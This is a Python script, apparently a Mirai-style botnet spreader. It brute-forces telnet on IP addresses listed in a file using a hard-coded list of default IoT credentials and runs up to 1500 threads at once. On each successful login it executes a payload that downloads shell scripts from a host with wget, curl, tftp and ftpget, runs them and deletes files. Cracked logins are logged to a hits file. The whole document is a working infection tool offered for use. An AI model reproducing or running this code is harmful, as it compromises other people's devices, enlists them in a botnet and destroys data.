# Made by https://github.com/Its-Vichy

import os, pyfade, threading, xtelnet, time, math

__PAYLOAD__ = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ip/soramrk.sh; curl -O http://ip/soramrk.sh; chmod 777 soramrk.sh; sh soramrk.sh; tftp ip -c get soramrk.sh; chmod 777 soramrk.sh; sh soramrk.sh; tftp -r soramrk2.sh -g ip; chmod 777 soramrk2.sh; sh soramrk2.sh; ftpget -v -u anonymous -p anonymous -P 21 ip soramrk1.sh soramrk1.sh; sh soramrk1.sh; rm -rf soramrk.sh soramrk.sh soramrk2.sh soramrk1.sh; rm -rf *'

class DataBoard:
    def __init__(self):
        self.number = 0
        self.thread = 0
        self.found = []
        self.tested = 1
        self.total = 1
    
    def save(self, ip, port, username, password):
        self.found.append(f'{ip}-{port} - {username}:{password}')

    def saver(self):
        with open('./hit.txt', 'a+') as f:
            while True:
                time.sleep(5)
                if len(self.found) != 0:
                        for hit in self.found:
                            f.write(hit + '\n')
                            self.found.remove(hit)

class UI:
    def __init__(self, databoard):
        self.DataBoard = databoard

        self.print_logo()

    def print_logo(self):
        os.system('cls' if os.name == 'nt' else 'clear') # ┌─┐│
        print(pyfade.Fade.Vertical(pyfade.Colors.purple_to_blue, ''' 
        __     __     ______     __  __     ______     ______
       /\ \  _ \ \   /\  ___\   /\ \_\ \   /\  ___\   /\  ___\\
       \ \ \/ ".\ \  \ \  __\   \ \____ \  \ \  __\   \ \___  \ 
        \ \__/".~\_\  \ \_____\  \/\_____\  \ \_____\  \/\_____\ 
         \/_/   \/_/   \/_____/   \/_____/   \/_____/   \/_____/ \n\n'''))
        
        print(f"\t{'N°#':<3}  {'IP ADRESS':<15} {'PORT':<8} {'USERNAME':<15}   {'PASSWORD':<15}    {'STATUS':<13}      {'TESTED':<12}")
        print(f"\t{'-'*3}  {'--'*7}  {'---'*2}   {'---'*5}   {'---'*5}    {'---'*5}    {'---'*4}")

    def print_combo(self, number, ip, port, username, password, status):
        print(f"\t{f'{number}':<3}  {f'{ip}':<15} {f'{port}':<8} {f'{username}':<15}   {f'{password}':<15}    {f'{status}':<13}      {f'{self.DataBoard.tested}/{self.DataBoard.total} ({math.floor(100 * float(self.DataBoard.tested) / float(self.DataBoard.total))}%)':<12}")

class Bruteforce(threading.Thread):
    def __init__(self, ip, data, ui):
        threading.Thread.__init__(self)
        self.data = data
        self.ui = ui
        self.ip_addr = ip

    def bruteforce(self):
        for combo in ['root:lmao', 'root:xc3511', 'root:root', 'admin:admin', 'amx:amx', 'NetLinx:NetLinx', 'deamon:deamon', 'cisco:cisco', 'root:vizxv', 'root:admin', 'admin:admin', 'root:888888', 'root:xmhdipc', 'root:default', 'root:juantech', 'root:123456', 'root:54321', 'support:support', 'root:', 'admin:password', 'root:root', 'root:12345', 'user:user', 'admin:', 'root:pass', 'admin:admin1234', 'root:1111', 'admin:smcadmin', 'admin:1111', 'root:666666', 'root:password', 'root:1234', 'root:klv123', 'Administrator:admin', 'service:service', 'supervisor:supervisor', 'guest:guest', 'guest:12345', 'admin1:password', 'administrator:1234', '666666:666666', '888888:888888', 'ubnt:ubnt', 'root:klv1234', 'root:Zte521', 'root:hi3518', 'root:jvbzd', 'root:anko', 'root:zlxx.', 'root:7ujMko0vizxv', 'root:7ujMko0admin', 'root:system', 'root:ikwb', 'root:dreambox', 'root:user', 'root:realtek', 'root:00000000', 'admin:1111111', 'admin:1234', 'admin:12345', 'admin:54321', 'admin:123456', 'admin:7ujMko0admin', 'admin:pass', 'hikvision:hikvision']:
            combo = combo.split(':')
            try:
                session = xtelnet.session()
                session.connect(self.ip_addr, combo[0], combo[1])

                if combo[1] == 'lmao':
                    self.ui.print_combo(self.data.number, self.ip_addr, 23, combo[0], combo[1], f'honeypot')
                    break

                session.execute(__PAYLOAD__)
                session.close()

                self.data.save(self.ip_addr, 23, combo[0], combo[1])
                self.ui.print_combo(self.data.number, self.ip_addr, 23, combo[0], combo[1], f'success')
                self.data.number += 1
                break
            except Exception as err:
                if 'Authentication Failed' not in str(err):
                    break

    def run(self):
        self.data.thread += 1
        self.bruteforce()
        self.data.thread -= 1
        self.data.tested += 1

def main():
    data = DataBoard()    
    ui = UI(data)

    threading.Thread(target= data.saver).start()
    with open('./23.txt', 'r+') as f:
        for _ in f:
            data.total += 1

    with open('./23.txt', 'r+') as f:
        for ip in f:
            while data.thread > 1500:
                time.sleep(5)
            
            threading.Thread(target= Bruteforce(ip.split('\n')[0], data, ui).start()).start()

main()
